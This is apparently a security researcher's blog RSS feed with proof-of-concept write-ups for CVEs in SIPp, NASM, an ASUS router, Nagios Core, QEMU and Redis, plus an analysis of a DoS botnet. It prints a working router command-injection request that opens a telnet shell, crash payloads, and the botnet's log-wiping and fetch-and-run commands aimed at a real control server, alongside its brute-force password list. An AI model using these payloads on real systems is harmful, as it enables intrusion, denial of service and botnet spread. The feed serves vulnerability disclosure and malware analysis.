<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title></title>
    <description>Minimalist Jekyll theme for technical writing blog.</description>
    <link>https://fakhrizulkifli.github.io/</link>
    <atom:link href="https://fakhrizulkifli.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 03 Dec 2018 00:04:32 +0800</pubDate>
    <lastBuildDate>Mon, 03 Dec 2018 00:04:32 +0800</lastBuildDate>
    <generator>Jekyll v3.8.5</generator>
    
      <item>
        <title>SIPp 3.6 - Local Buffer Overflow (PoC)</title>
        <description>&lt;p&gt;Exploit Title: SIPp 3.6 - Local Buffer Overflow (PoC)
Date: 2018-06-30
Exploit Author: Fakhri Zulkifli
Vendor Homepage: http://sipp.sourceforge.net/
Software Link: https://github.com/SIPp/sipp/releases
Version: 3.6-dev and earlier
Tested on: 3.6-dev&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./sipp -3pcc `python -c ‘print “A” * 300'`

#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425
#1 0x668d06 in main /home/user/sipp/src/sipp.cpp:1531:17
#2 0x7ff5ec21282f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)

$ ./sipp -i `python -c ‘print “A” * 300'`

#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425
#1 0x66a303 in main /home/user/sipp/src/sipp.cpp:1477:17
#2 0x7f281302682f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)

$ ./sipp -log_file `python -c ‘print “A” * 300'`

#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425
#1 0x66912f in main /home/user/sipp/src/sipp.cpp:1706:17
#2 0x7f6ca663782f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
        <link>https://fakhrizulkifli.github.io/2018/sipp_3.6/</link>
        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/sipp_3.6/</guid>
        
        
      </item>
    
      <item>
        <title>B08f9dc5784532be5b3f695f37c7781b</title>
        <description>&lt;p&gt;Initial file dropped:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; wget keedz.tk/client ; chmod +x client ; ./client ; rm -rf client ; rm -rf bash_history ; export HISTFILE=/dev/null ; rm -rf botz.sh ; exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;client&lt;/code&gt; is a 64-bit ELF binary. The binary acts as a DoS bot which connect to their CNC (5.135.209.121) on port 23.&lt;/p&gt;

&lt;p&gt;Available commands:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GETLOCALIP
SCANNER ON | OFF
HOLD
JUNK
HTTP
COMBO
KILLATTK
FUCKOFF
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Below is the connection to the CNC:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trying 5.135.209.121...
Connected to ip121.ip-5-135-209.eu.
Escape character is '^]'.
!* SCANNER ON
PING
PONG
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you try to connect for the 2nd time, this will be output.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trying 5.135.209.121...
Connected to ip121.ip-5-135-209.eu.
Escape character is '^]'.
!* LOLNOGTFO
Connection closed by foreign host.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, the CNC can be connected again after a few seconds.&lt;/p&gt;

&lt;p&gt;The binary spread by bruteforcing the login for a random IP addresses.&lt;/p&gt;

&lt;p&gt;List of usernames:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root
admin
user
login
guest
support
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;List of passwords:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root
toor
admin
user
guest
login
changeme
1234
12345
123456
default
password
support
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once logged in, it will execute the following commands:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.135.209.121 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.135.209.121; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 5.135.209.121 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inside bins.sh, more binary will be fetch&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-e #!/bin/bash
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sshd; chmod +x sshd; ./sshd; rm -rf sshd
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/openssh; chmod +x openssh; ./openssh; rm -rf openssh
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bash; chmod +x bash; ./bash; rm -rf bash
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/tftp; chmod +x tftp; ./tftp; rm -rf tftp
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/wget; chmod +x wget; ./wget; rm -rf wget
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/cron; chmod +x cron; ./cron; rm -rf cron
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ftp; chmod +x ftp; ./ftp; rm -rf ftp
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/pftp; chmod +x pftp; ./pftp; rm -rf pftp
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sh; chmod +x sh; ./sh; rm -rf sh
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/' '; chmod +x ' '; ./' '; rm -rf ' '
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/apache2; chmod +x apache2; ./apache2; rm -rf apache2
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
        <link>https://fakhrizulkifli.github.io/2018/b08f9dc5784532be5b3f695f37c7781b/</link>
        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/b08f9dc5784532be5b3f695f37c7781b/</guid>
        
        
      </item>
    
      <item>
        <title>Cve 2018 16517</title>
        <description>&lt;p&gt;The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.&lt;/p&gt;

&lt;p&gt;Credit goes to &lt;a href=&quot;https://twitter.com/zeifan&quot;&gt;@zeifan&lt;/a&gt; for discovering this vulnerability by using the AFL fuzzer.&lt;/p&gt;

&lt;h1 id=&quot;proof-of-crash&quot;&gt;Proof-of-Crash&lt;/h1&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. echo &quot;equ   push  rax&quot; &amp;gt; poc
2. nasm -f elf poc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef struct insn { /* an instruction itself */
    char            *label;                 /* the label defined, or NULL */
    int             prefixes[MAXPREFIX];    /* instruction prefixes, if any */
    enum opcode     opcode;                 /* the opcode - not just the string */
    enum ccode      condition;              /* the condition code, if Jcc/SETcc */
    int             operands;               /* how many operands? 0-3 (more if db et al) */
    int             addr_size;              /* address size */
    operand         oprs[MAX_OPERANDS];     /* the operands, defined as above */
    extop           *eops;                  /* extended operands */
    int             eops_float;             /* true if DD and floating */
    int32_t         times;                  /* repeat count (TIMES prefix) */
    bool            forw_ref;               /* is there a forward reference? */
    bool            rex_done;               /* REX prefix emitted? */
    int             rex;                    /* Special REX Prefix */
    int             vexreg;                 /* Register encoded in VEX prefix */
    int             vex_cm;                 /* Class and M field for VEX prefix */
    int             vex_wlp;                /* W, P and L information for VEX prefix */
    uint8_t         evex_p[3];              /* EVEX.P0: [RXB,R',00,mm], P1: [W,vvvv,1,pp] */
                                            /* EVEX.P2: [z,L'L,b,V',aaa] */
    enum ttypes     evex_tuple;             /* Tuple type for compressed Disp8*N */
    int             evex_rm;                /* static rounding mode for AVX512 (EVEX) */
    int8_t          evex_brerop;            /* BR/ER/SAE operand position */
} insn;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void assemble_file(const char *fname, StrList **depend_ptr)
{
    char *line;
    insn output_ins;
    int i;
    uint64_t prev_offset_changed;
    int64_t stall_count = 0; /* Make sure we make forward progress... */

    [...]

        while ((line = preproc-&amp;gt;getline())) {
            if (++globallineno &amp;gt; nasm_limit[LIMIT_LINES])
                nasm_fatal(0,
                           &quot;overall line count exceeds the maximum %&quot;PRId64&quot;\n&quot;,
                           nasm_limit[LIMIT_LINES]);

            /*
             * Here we parse our directives; this is not handled by the
             * main parser.
             */
            if (process_directives(line))
                goto end_of_line; /* Just do final cleanup */

            /* Not a directive, or even something that starts with [ */
            parse_line(pass1, line, &amp;amp;output_ins);   &amp;lt;-- [1]

            if (optimizing &amp;gt; 0) {
                if (forwref != NULL &amp;amp;&amp;amp; globallineno == forwref-&amp;gt;lineno) {
                    output_ins.forw_ref = true;
    [...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In assemble_file function, there is an object (output_ins) to a structure (struct insn) which contains the informations regarding the opcode being parsed.
Inside the assemble_file, a function parse_line is called in order initialize the object.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;insn *parse_line(int pass, char *buffer, insn *result)
{
    bool insn_is_label = false;
    struct eval_hints hints;
    int opnum;
    int critical;
    bool first;
    bool recover;
    int i;

    nasm_static_assert(P_none == 0);

restart_parse:
    first               = true;
    result-&amp;gt;forw_ref    = false;

    stdscan_reset();
    stdscan_set(buffer);
    i = stdscan(NULL, &amp;amp;tokval);

    memset(result-&amp;gt;prefixes, P_none, sizeof(result-&amp;gt;prefixes));
    result-&amp;gt;times       = 1;    /* No TIMES either yet */
    result-&amp;gt;label       = NULL; /* Assume no label */       &amp;lt;-- [2]
    result-&amp;gt;eops        = NULL; /* must do this, whatever happens */
    result-&amp;gt;operands    = 0;    /* must initialize this */
    result-&amp;gt;evex_rm     = 0;    /* Ensure EVEX rounding mode is reset */
    result-&amp;gt;evex_brerop = -1;   /* Reset EVEX broadcasting/ER op position */
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here the structure’s member label which should be containing the definition of the label is clearly being assigned to NULL.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [...]

    if (i == TOKEN_ID || (insn_is_label &amp;amp;&amp;amp; i == TOKEN_INSN)) {    &amp;lt;-- not taken
        /* there's a label here */
        first = false;
        result-&amp;gt;label = tokval.t_charptr;
        i = stdscan(NULL, &amp;amp;tokval);
        if (i == ':') {         /* skip over the optional colon */
            i = stdscan(NULL, &amp;amp;tokval);
        } else if (i == 0) {
            nasm_error(ERR_WARNING | ERR_WARN_OL | ERR_PASS1,
                  &quot;label alone on a line without a colon might be in error&quot;);
        }
        if (i != TOKEN_INSN || tokval.t_integer != I_EQU) {
            /*
             * FIXME: location.segment could be NO_SEG, in which case
             * it is possible we should be passing 'absolute.segment'. Look into this.
             * Work out whether that is *really* what we should be doing.
             * Generally fix things. I think this is right as it is, but
             * am still not certain.
             */
            define_label(result-&amp;gt;label,
                         in_absolute ? absolute.segment : location.segment,
                         location.offset, true);
    [...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, down to a few lines of code, there is a check before the it gets initialized with a valid value which is then skipped because the boolean insn_is_label is always FALSE.
Therefore, the result-&amp;gt;label remains NULL.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [...]

            /*  forw_ref */
            if (output_ins.opcode == I_EQU) {
                if (!output_ins.label)
                    nasm_error(ERR_NONFATAL,
                               &quot;EQU not preceded by label&quot;);

                if (output_ins.operands == 1 &amp;amp;&amp;amp;
                    (output_ins.oprs[0].type &amp;amp; IMMEDIATE) &amp;amp;&amp;amp;
                    output_ins.oprs[0].wrt == NO_SEG) {
                    define_label(output_ins.label,
                                 output_ins.oprs[0].segment,
                                 output_ins.oprs[0].offset, false);   &amp;lt;-- [3]
    [...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So back to the assemble_line, there is a check if the opcode is EQU and surprisingly the nasm_error did not handle the error safely (marked as ERR_NONFATAL).
The output_ins.label is then being passed into 3 functions before it gets dereferenced (define_label -&amp;gt; find_label -&amp;gt; islocal).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static bool islocal(const char *l)
{
    if (tasm_compatible_mode) {
        if (l[0] == '@' &amp;amp;&amp;amp; l[1] == '@')
            return true;
    }
    return (l[0] == '.' &amp;amp;&amp;amp; l[1] != '.');  &amp;lt;-- boom
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-16517/</link>
        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-16517/</guid>
        
        
      </item>
    
      <item>
        <title>Cve 2018 15887</title>
        <description>&lt;p&gt;Exploit Title: ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution&lt;br /&gt;
Date: 2018-08-02&lt;br /&gt;
Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
Vendor Homepage: https://www.asus.com/&lt;br /&gt;
Software Link: https://www.asus.com/Networking/DSLN12E_C1/HelpDesk_BIOS/&lt;br /&gt;
Version: 1.1.2.3_345&lt;br /&gt;
Tested on: 1.1.2.3_345&lt;br /&gt;
&lt;br /&gt;
GET /Main_Analysis_Content.asp?current_page=Main_Analysis_Content.asp&amp;amp;next_page=Main_Analysis_Content.asp&amp;amp;next_host=www.target.com&amp;amp;group_id=&amp;amp;modified=0&amp;amp;action_mode=+Refresh+&amp;amp;action_script=&amp;amp;action_wait=&amp;amp;first_time=&amp;amp;applyFlag=1&amp;amp;preferred_lang=EN&amp;amp;firmver=1.1.2.3_345-g987b580&amp;amp;cmdMethod=ping&amp;amp;destIP=%60utelnetd+-p+1337%60&amp;amp;pingCNT=5 HTTP/1.1&lt;br /&gt;
Host: www.target.com&lt;br /&gt;
Connection: keep-alive&lt;br /&gt;
Pragma: no-cache&lt;br /&gt;
Cache-Control: no-cache&lt;br /&gt;
Upgrade-Insecure-Requests: 1&lt;br /&gt;
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&lt;br /&gt;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,&lt;em&gt;/&lt;/em&gt;;q=0.8&lt;br /&gt;
Referer: http://www.target.com/Main_Analysis_Content.asp&lt;br /&gt;
Accept-Encoding: gzip, deflate&lt;br /&gt;
Accept-Language: en-US,en;q=0.9&lt;br /&gt;
&lt;br /&gt;
To connect&lt;br /&gt;&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;telnet www.target.com 1337&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-15887/</link>
        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-15887/</guid>
        
        
      </item>
    
      <item>
        <title>Cve 2018 13458</title>
        <description>&lt;p&gt;Exploit Title: Nagios Core qh_core Denial of Service&lt;br /&gt;
Date: 2018-07-09&lt;br /&gt;
Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
Software Link: https://www.nagios.org/downloads/nagios-core/&lt;br /&gt;
Version: 4.4.1 and earlier&lt;br /&gt;
Tested on: 4.4.1&lt;br /&gt;
CVE : CVE-2018-13458&lt;br /&gt;
&lt;br /&gt;
qh_core in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;br /&gt;
&lt;br /&gt;
$ echo -ne “#core\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
$ echo -ne “@core\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
&lt;br /&gt;
#0 0x5546bc in qh_core /home/user/nagioscore/base/query-handler.c:408:6&lt;br /&gt;
#1 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12&lt;br /&gt;
#2 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4&lt;br /&gt;
#3 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12&lt;br /&gt;
#4 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4&lt;br /&gt;
#5 0x7f6887b9882f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
#6 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13458/</link>
        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13458/</guid>
        
        
      </item>
    
      <item>
        <title>Cve 2018 13457</title>
        <description>&lt;p&gt;Exploit Title: Nagios Core qh_echo Denial of Service&lt;br /&gt;
Date: 2018-07-09&lt;br /&gt;
Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
Software Link: https://www.nagios.org/downloads/nagios-core/&lt;br /&gt;
Version: 4.4.1 and earlier&lt;br /&gt;
Tested on: 4.4.1&lt;br /&gt;
CVE : CVE-2018-13457&lt;br /&gt;
&lt;br /&gt;
qh_echo in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;br /&gt;
&lt;br /&gt;
$ echo -ne “#echo\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
$ echo -ne “@echo\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
&lt;br /&gt;
#0 0x4cb18b in __interceptor_strcmp.part.60 /home/user/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:422&lt;br /&gt;
#1 0x554e98 in qh_echo /home/user/nagioscore/base/query-handler.c:29:7&lt;br /&gt;
#2 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12&lt;br /&gt;
#3 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4&lt;br /&gt;
#4 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12&lt;br /&gt;
#5 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4&lt;br /&gt;
#6 0x7f183c5f782f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
#7 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13457/</link>
        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13457/</guid>
        
        
      </item>
    
      <item>
        <title>Cve 2018 13441</title>
        <description>&lt;p&gt;Exploit Title: Nagios Core qh_help Denial of Service&lt;br /&gt;
Date: 2018-07-09&lt;br /&gt;
Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
Vendor Homepage: https://www.nagios.org/&lt;br /&gt;
Software Link: https://www.nagios.org/downloads/nagios-core/&lt;br /&gt;
Version: 4.4.1 and earlier&lt;br /&gt;
Tested on: 4.4.1&lt;br /&gt;
CVE : CVE-2018-13441&lt;br /&gt;
&lt;br /&gt;
qh_help in Nagios Core version 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attacker to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.&lt;br /&gt;
&lt;br /&gt;
$ echo -ne “#help\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
$ echo -ne “@help\0” | socat unix-connect:./poc/nagios.qh -&lt;br /&gt;
&lt;br /&gt;
#0 0x554fef in qh_help /home/user/nagioscore/base/query-handler.c:374:7&lt;br /&gt;
#1 0x5543db in qh_input /home/user/nagioscore/base/query-handler.c:227:12&lt;br /&gt;
#2 0x6fac51 in iobroker_poll /home/user/nagioscore/lib/iobroker.c:353:4&lt;br /&gt;
#3 0x5bc334 in event_execution_loop /home/user/nagioscore/base/events.c:1136:12&lt;br /&gt;
#4 0x53a503 in main /home/user/nagioscore/base/nagios.c:844:4&lt;br /&gt;
#5 0x7f61587ae82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
#6 0x42b278 in _start (/home/user/nagioscore/base/nagios+0x42b278)&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-13441/</link>
        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-13441/</guid>
        
        
      </item>
    
      <item>
        <title>Cve 2018 12617</title>
        <description>&lt;p&gt;Exploit Title: QEMU Guest Agent Denial of Service&lt;br /&gt;
Date: 2018-06-07&lt;br /&gt;
Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
Vendor Homepage: https://www.qemu.org/&lt;br /&gt;
Software Link: https://www.qemu.org/download/&lt;br /&gt;
Version: 2.12.50 and earlier&lt;br /&gt;
Tested on: 2.12.50&lt;br /&gt;
CVE : CVE-2018-12617&lt;br /&gt;
&lt;br /&gt;
QEMU Guest Agent 2.12.50 and earlier has an integer overflow causing a g_malloc0() call to trigger a segfault() call when trying to allocate a large memory chunk. The vulnerability can be exploited by sending a specific QMP command to the agent via the listening socket.&lt;br /&gt;
&lt;br /&gt;
1st, execute the guest-agent using the following command:&lt;br /&gt;
&lt;br /&gt;
$ qemu-ga -m unix-listen -p /tmp/qga.sock -t /tmp&lt;br /&gt;
&lt;br /&gt;
2nd, on the other console, connect to the UNIX socket using socat:&lt;br /&gt;
&lt;br /&gt;
$ socat unix-connect:/tmp/qga.sock -&lt;br /&gt;
&lt;br /&gt;
3rd, enter the following QMP command:&lt;br /&gt;
&lt;br /&gt;
{“execute”:”guest-file-open”, “arguments”:{“path”:”/tmp/poc”,”mode”:”w+”}}&lt;br /&gt;
{“return”: 1000}&lt;br /&gt;
{“execute”:”guest-file-read”, “arguments”:{“handle”:1000,”count”:4294967295}}&lt;br /&gt;
&lt;br /&gt;
The guest-file-read must be specified with the correct handle value (file descriptor). Different files will have different handle value.&lt;br /&gt;
&lt;br /&gt;
#0 0x5598eed0a1af in calloc /home/user/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:107&lt;br /&gt;
#1 0x7f2ce5d7d770 in g_malloc0 (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4f770)&lt;br /&gt;
#2 0x5598eed84996 in qmp_marshal_guest_file_read /home/user/qemu/qga/qapi-generated/qga-qapi-commands.c:425:14&lt;br /&gt;
#3 0x5598eeda4fcf in do_qmp_dispatch /home/user/qemu/qapi/qmp-dispatch.c:119:5&lt;br /&gt;
#4 0x5598eeda4fcf in qmp_dispatch /home/user/qemu/qapi/qmp-dispatch.c:168&lt;br /&gt;
#5 0x5598eed59bff in process_command /home/user/qemu/qga/main.c:589:11&lt;br /&gt;
#6 0x5598eed59bff in process_event /home/user/qemu/qga/main.c:626&lt;br /&gt;
#7 0x5598eedb5f13 in json_message_process_token /home/user/qemu/qobject/json-streamer.c:105:5&lt;br /&gt;
#8 0x5598eee25d9b in json_lexer_feed_char /home/user/qemu/qobject/json-lexer.c:323:13&lt;br /&gt;
#9 0x5598eee25333 in json_lexer_feed /home/user/qemu/qobject/json-lexer.c:373:15&lt;br /&gt;
#10 0x5598eed5a95e in channel_event_cb /home/user/qemu/qga/main.c:659:9&lt;br /&gt;
#11 0x5598eed710c1 in ga_channel_client_event /home/user/qemu/qga/channel-posix.c:92:23&lt;br /&gt;
#12 0x7f2ce5d78049 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a049)&lt;br /&gt;
&lt;br /&gt;
References:&lt;br /&gt;&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;https://lists.gnu.org/archive/html/qemu-devel/2018-06/msg03385.html&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-12617/</link>
        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-12617/</guid>
        
        
      </item>
    
      <item>
        <title>Cve 2018 12453</title>
        <description>&lt;p&gt;Exploit Title: Redis 5.0 Denial of Service&lt;br /&gt;
Date: 2018-06-13&lt;br /&gt;
Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
Vendor Homepage: https://redis.io/&lt;br /&gt;
Software Link: https://redis.io/download&lt;br /&gt;
Version: 5.0&lt;br /&gt;
Fixed on: 5.0&lt;br /&gt;
CVE : CVE-2018-12453&lt;br /&gt;
&lt;br /&gt;
